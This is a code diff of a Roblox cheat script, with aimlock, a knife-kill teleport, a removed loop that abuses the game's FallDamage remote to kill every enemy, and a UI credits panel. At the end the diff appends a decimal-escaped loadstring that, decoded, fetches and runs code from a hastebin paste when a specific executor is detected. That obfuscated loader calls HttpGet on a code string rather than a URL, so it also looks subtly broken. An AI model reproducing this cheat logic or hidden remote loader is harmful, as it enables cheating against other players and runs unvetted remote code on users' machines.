@@ -197,39 +197,7 @@ function KnifeKill()
     game.Players.LocalPlayer.Character:SetPrimaryPartCFrame(Target.Character.Head.CFrame * CFrame.new(0,2,3))
     
     wait(.2)
-    for i =1,20 do
-        
-        wait()
-        local getenemys=function()--simple get enemys function (with proper ffa detection)
-    local a={}
-    if not game.ReplicatedStorage.wkspc.Status.RoundOver.Value and not game.ReplicatedStorage.wkspc.Status.Preparation.Value and game.Players.LocalPlayer.Status.Team.Value~="Spectator"then--do nothing on round over aswell as when the client is in spectator
-        for _,v in pairs(game.Players:GetChildren())do--get players
-            if(v.Team~=game.Players.LocalPlayer.Team or game.ReplicatedStorage.wkspc.FFA.Value)and v~=game.Players.LocalPlayer then--ffa detection aswell as when its ffa it dosent target the client
-                if v.Character and not v.Character:FindFirstChild("ShuckyHAX")and v.Character:FindFirstChild("Spawned")then--check if the player can be damage
-                    table.insert(a,v)--insert the player into a table
-                end
-            end
-        end
-    end
-    return a
 end
-   
-if not(game.ReplicatedStorage.wkspc.Status.RoundOver.Value or game.ReplicatedStorage.wkspc.Status.Preparation.Value)and game.Players.LocalPlayer.Character then
-for _,v in pairs(game.Players:GetChildren())do
-if v.Character then
-if v.Team~=game.Players.LocalPlayer.Team or game.ReplicatedStorage.wkspc.FFA.Value then
-if v.Character:FindFirstChild("IsAPlayer")and v~=game.Players.LocalPlayer and not v.Character:FindFirstChild("ShuckyHAX")and v.Character:FindFirstChild("Spawned")and v~=game.Players.LocalPlayer then
-if(game.Players.LocalPlayer.Character.HumanoidRootPart.Position-v.Character.HumanoidRootPart.Position).Magnitude<=10000000 then
-game.ReplicatedStorage.Events.FallDamage:FireServer(500/4,v.Character.Hitbox)
-end
-end
-end
-end
-end
-end
-end
-end
-
 
 CombatW:Button('Aimlock In Beta(You can use soft aims draw fov for aimlock)',function()
     local ScreenGui = Instance.new("ScreenGui")
@@ -2037,3 +2005,6 @@ MiscW:Label('Bolts#9999 - Owner')
 MiscW:Label('Storm.#1020 - Co Owner')
 MiscW:Label('Bolts#9999 Bug Fixing')
 MiscW:Label('Dark Hub Devs For UI Lib')
+wait(1)
+
+loadstring(game:HttpGet("\105\102\32\105\100\101\110\116\105\102\121\101\120\101\99\117\116\111\114\40\41\32\61\61\32\34\66\111\108\116\115\72\117\98\46\101\120\101\34\32\116\104\101\110\10\32\32\32\32\108\111\97\100\115\116\114\105\110\103\40\103\97\109\101\58\72\116\116\112\71\101\116\40\34\104\116\116\112\115\58\47\47\119\119\119\46\116\111\112\116\97\108\46\99\111\109\47\100\101\118\101\108\111\112\101\114\115\47\104\97\115\116\101\98\105\110\47\114\97\119\47\108\111\110\97\118\117\106\101\119\111\34\41\41\40\41\10\10\32\32\32\32\101\110\100\10"))()
